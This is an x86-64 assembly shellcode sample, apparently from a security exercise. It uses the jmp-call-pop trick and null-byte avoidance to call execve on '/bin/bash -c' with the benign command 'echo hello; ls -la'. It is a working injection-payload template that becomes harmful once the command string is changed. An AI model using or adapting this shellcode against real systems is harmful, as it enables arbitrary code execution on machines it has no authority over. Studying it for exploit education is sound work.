section .text
  global _start
    _start:
		BITS 64
		jmp short two
	one:
		pop rbx           

		; set terminating 0x00 for strings
		xor al, al
		mov [rbx+9] , al
		mov [rbx+12], al
		mov [rbx+31], al

		; replace placeholders with addresses of actual strings
		mov [rbx+32], rbx

		lea rax     , [rbx+10]
		mov [rbx+40], rax

		lea rax     , [rbx+13]
		mov [rbx+48], rax

		xor rax     , rax
		mov [rbx+56], rax

		mov rdi, rbx
		lea rsi, [rbx+32]
		xor rdx, rdx
		mov rax, 0x1111113c
		sub rax, 0x11111101; rax = 59
		syscall
	two:
		call one                                                                   
		db '/bin/bash'         , 0xff ; 10 bytes
		db '-c'                , 0xff ;  3 bytes
		db 'echo hello; ls -la', 0xff ; 19 bytes
		db 'AAAAAAAA'      ; 8 bytes, place holder for argv[0] 
		db 'BBBBBBBB'      ; 8 bytes, Place holder for argv[1]
		db 'CCCCCCCC'      ; 8 bytes, Place holder for argv[2]
		db 'DDDDDDDD'      ; 8 bytes, Place holder for argv[3]
